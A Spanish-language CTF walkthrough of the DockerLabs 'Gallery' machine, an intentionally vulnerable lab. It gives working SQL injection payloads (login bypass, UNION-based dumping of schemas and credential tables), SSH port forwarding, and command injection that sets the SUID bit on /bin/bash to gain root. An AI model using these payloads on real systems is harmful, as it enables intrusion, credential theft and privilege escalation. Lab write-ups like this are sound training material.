---
icon: flag
---

# Gallery DockerLabs (Hard)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip gallery.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh gallery.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 03:18 EDT
Nmap scan report for bicho.dl (172.17.0.2)
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 19:95:1a:f2:f6:7a:a1:f1:ba:16:4b:58:a0:59:f2:02 (ECDSA)
|_  256 e7:e9:8f:b8:db:94:c2:68:11:4c:25:81:f1:ac:cd:ac (ED25519)
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.3.6)
|_http-title: Galer\xC3\xADa de Arte Digital
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
```

Veremos que hay un puerto `80` en el que aloja una pagina web, si nos metemos dentro veremos una tipica pagina de una galeria de una obra de arte, pero en la esquina derecha superior veremos un boton de `inicio` de sesion en el cual si entramos dentro veremos un `login` bastante interesante, vamos a probar a ver si fuera vulnerable a un `SQLi`.

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Si ponemos esa combinacion tan basica de un `SQLi` veremos que nos loguea, por lo que sabremos que es vulnerable a un `SQL Injecction` una vez echo eso, veremos esto siguiente:

<figure><img src="../../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>

Vemos varios campos en los cuales podemos probar a ver si hubiera algun otro parametro vulnerable para segurarnos, vamos a ir probando en todos combinaciones basicas para poder mostrar la informacion de las `DDBBs` u otro tipo de inyecciones.

Si metemos lo mas basico de nuevo `' OR 1=1-- -` en los 2 primeros `campos` del formulario, y le damos a enviar, veremos esto:

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 in /var/www/html/dashboard.php:16 Stack trace: #0 /var/www/html/dashboard.php(16): mysqli_query() #1 {main} thrown in /var/www/html/dashboard.php on line 16
```

Vemos que efectivamente es vulnerable a un `SQLi` y nos esta mostrando informacion de lo que ha petado a nivel de `DDBB`.

## Escalate user sam

Vamos a intentar descubrir cuantas columnas tiene la `DDBB` para poder realizar dicho `SQLi`.

```sql
' ORDER BY 5-- -
```

Si eso lo ponemos en la parte de:

<figure><img src="../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

Veremos que no nos da un error, pero si probamos el `6` ya si, por lo que ya sabemos que tiene `5` columnas y ahora podemos pasar a ver si funciona la siguiente `SQLi` de esta forma:

```sql
' UNION SELECT null, database(), null, null, null-- -
```

Si hacemos esto, veremos que nos funciona, ya que aparece otro recuadro mas en la pagina mostrando esto:

```
gallery_db
```

Por lo que sabemos que la segunda opcion del `SELECT` es vulnerable, por lo que vamos a intentar enumerar las tablas que hay dentro de la `DDBB` llamada `gallery_db`.

```sql
' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema=database()-- -
```

Info:

```
artworks
users
```

Vemos que nos sigue funcionando y hemos encontrado `2` tablas, por lo que vamos a ver que contiene la tabla `users` que es la que mas nos interesa.

```sql
' UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_name='users'-- -
```

Info:

```
id
password
username
```

Vemos que tiene `3` columnas, por lo que ahora sabiendo todo esto, ya si que podremos extraer la informacion de dicha tabla de la siguiente forma:

```sql
' UNION SELECT id, username, password, null, null FROM users-- -
```

O

```sql
' UNION SELECT null, CONCAT(username, ':', password), null, null, null FROM users-- -
```

La segunda opcion es para tenerlo mas ordenado, viendose de esta forma `username:password` y si hacemos esto veremos lo siguiente:

```
admin:2O]L)W{6c>Xx=Eu2#SV82%O%$#W}b3<
```

Podemos ver que obtuvimos solamente unas credenciales, pero no nos servira de mucho, si listamos esta vez todas las `DDBBs` veremos lo siguiente:

```sql
' UNION SELECT null, schema_name, null, null, null FROM information_schema.schemata-- -
```

Info:

```
mysql
information_schema
performance_schema
sys
gallery_db
secret_db
```

Vemos que hay una llamada `secret_db` por lo que vamos a sacar informacion de dicha tabla.

```sql
' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema='secret_db'-- -
```

Info:

```
secret
```

Veremos que hay una tabla llamada `secret` por lo que vamos a ver cuantas columnas tiene.

```sql
' UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_schema='secret_db' AND table_name='secret'-- -
```

Info:

```
id
ssh_pass
ssh_users
```

Vemos varias cosas interesantes, por lo que vemos hay credenciales de usuarios para conetcarnos por `SSH` vamos a extraer la informacion de la siguiente forma:

```sql
' UNION SELECT id, ssh_users, ssh_pass, null, null FROM secret_db.secret-- -
```

O

```sql
' UNION SELECT null, CONCAT(ssh_users, ':', ssh_pass), null, null, null FROM secret_db.secret-- -
```

Info:

```
sam:$uper$ecretP4$$w0rd123
```

Veremos que obtuvimos las credenciales para conectarnos por `SSH` por lo que haremos lo siguiente:

### SSH

```shell
ssh sam@<IP>
```

Metemos como contraseña `$uper$ecretP4$$w0rd123` y vereremos que estamos dentro.

## Escalate Privileges

Estando dentro si intentamos ver los puertos que que hay en la maquina victima a nivel local no podremos hacerlo con las herramientas tipicas como `ss` o `netstat`, pero si veremos que tenemos `nmap` instalado, por lo que vamos a realizar lo siguiente:

```shell
nmap -p- 127.0.0.1
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-07 10:43 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000049s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
8888/tcp  open  sun-answerbook
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds
```

Vemos que el que mas nos atrae es el puerto `8888` por lo que vamos a pasarnoslo a nuestra maquina `host` a ver que vemos, esto lo podremos hacer mediante `SSH` realizando un `portforwarding`.

> Maquina Host

```shell
ssh sam@<IP> -L 8888:localhost:8888
```

Metemos como contraseña `$uper$ecretP4$$w0rd123` y estaremos de nuevo dentro de la maquina pero habiendo redirigido el flujo del puerto a la maquina `host` por lo que si nos metemos ahora en esta direccion:

```
URL = http://localhost:8888/
```

Veremos esto:

<figure><img src="../../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado y estaremos viendo la pagina que esta en local en la maquina victima del puerto `8888`.

Si en la pagina ponemos cualquier comando que no sea valido, nos pondra que consultemos al `help`, pero solamente nos apareceran una serie de comandos que no nos serviran de mucho, si probamos a concatenar comandos a ver si se ejecuta veremos que si funciona:

```shell
help;id
```

Info:

<figure><img src="../../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

Vemos que lo esta ejecutando todo `root`, por lo que vamos a probar a establecer la `bash` con permisos `SUID` de la siguiente forma:

```shell
help;chmod u+s /bin/bash
```

Ahora si nos volvemos a donde tenemos la `shell` con el usuario `sam` y listamos la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Veremos que ha funcionado, por lo que haremos lo siguiente para ser el usuario `root`.

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto ya seremos el usuario `root` por lo que habremos terminado la maquina.
